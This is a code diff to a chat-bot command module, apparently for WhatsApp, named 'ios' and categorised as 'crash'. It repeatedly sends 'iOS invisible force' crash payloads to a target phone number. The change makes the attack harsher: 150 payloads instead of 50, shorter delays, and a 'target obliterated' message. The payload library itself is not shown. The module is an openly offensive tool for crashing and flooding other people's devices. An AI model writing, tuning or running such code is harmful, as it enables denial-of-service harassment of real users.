@@ -6,7 +6,7 @@ module.exports = {
     name: 'ios',
     aliases: ['ioscrash', 'iosforce'],
     category: 'crash',
-    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ ᴄʀᴀsʜ',
+    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
     usage: '.ios <number>',
     waitReact: true,
 
@@ -27,17 +27,17 @@ module.exports = {
             crashLib = new CrashLib(sock);
         }
         
-        const TOTAL = 50;
+        const TOTAL = 150;
         const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
         
         try {
             for (let i = 0; i < TOTAL; i++) {
                 await crashLib.iosInvisibleForce(target);
                 await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
-                await new Promise(r => setTimeout(r, 200));
+                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
             }
             
-            await bar.done(`✅ ɪᴏs ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
+            await bar.done(`✅ ɪᴏs ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
         } catch (e) {
             await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
         }
